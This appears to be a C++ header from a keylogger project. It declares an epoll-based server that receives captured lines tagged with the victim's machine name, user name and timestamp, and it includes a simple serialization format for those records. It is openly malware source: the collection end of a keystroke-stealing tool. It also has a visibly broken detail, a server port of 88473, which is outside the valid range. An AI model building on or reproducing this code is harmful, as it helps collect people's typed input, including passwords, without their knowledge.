#include <atomic>
#include <memory>
#include <sys/epoll.h>
#include <netdb.h>
#include <cstring>
#include <netinet/in.h>
#include <sys/socket.h>
#include <thread>
#include <vector>
#include <mutex>
#include <sstream>
#include "Connection.hpp"

#ifndef KEYLOGGER_SERVERMAIN_H
#define KEYLOGGER_SERVERMAIN_H

#define SERVER_PORT "88473"
#define MAX_EVENTS 16

using namespace std;

struct Request{
public:
    string Line;
    string MachineName;
    string UserName;
    string Timestamp;

    static const char DELIMITER_START = '{';
    static const char DELIMITER_END = '}';
    static const char UNIT_START = '(';
    static const char UNIT_END = ')';

    Request() = default;

    Request(string Line, string MachineName, string UserName, string Timestamp):
    Line(move(Line)), MachineName(move(MachineName)), UserName(move(UserName)),Timestamp(move(Timestamp)){};

    [[nodiscard]] string Serialzie() const{
        stringstream result{};
        result << DELIMITER_START
               << UNIT_START
               << Line
               << UNIT_END
               << UNIT_START
               << MachineName
               << UNIT_END
               << UNIT_START
               << UserName
               << UNIT_END
               << UNIT_START
               << Timestamp
               << UNIT_END
               << DELIMITER_END;
        return result.str();
    }

    static Request Deserialize(const string& inp){
        string section;
        auto end = inp.find(DELIMITER_END);
        if (end != string::npos)
            section = inp.substr(0, end);
        int i;
        int unitIndex=0;
        string units[] = {"","","",""};
        for (i=2;i<section.size();i++){
            if(section[i] == UNIT_END){
                unitIndex++;
                continue;
            }
            units[unitIndex]+=section[i];
        }
        units[1] = units[1].substr(1,units[1].size()-1);
        units[2] = units[2].substr(1,units[2].size()-1);
        units[3] = units[3].substr(1,units[3].size()-1);
        return {units[0],units[1],units[2],units[3]};
    }


};

class ServerMain {
public:
    ServerMain();
    ~ServerMain();
    void RunServer();
    void StopServer();
private:
    void Init();
    void Loop();
    int FileDescriptor;
    int EpollFD;
    string ServerName;
    thread* ServerThread;
    shared_ptr<atomic<bool>> SharedStatus;
    weak_ptr<atomic<bool>> Status;
    shared_ptr<vector<shared_ptr<Connection>>> Connections;
    shared_ptr<vector<shared_ptr<Request>>> Requests;
    shared_ptr<mutex> m_Connections;
    shared_ptr<mutex> m_Requests;

    void PushConnection(const shared_ptr<Connection>& sharedPtr);
    void PushRequest(const shared_ptr<Request>& sharedPtr);
    void RemoveConnection(int fd);
    shared_ptr<Request> PopRequest();

    shared_ptr<Connection> GetConnectionByFd(int fd);

    void Enact();
};


#endif //KEYLOGGER_SERVERMAIN_H
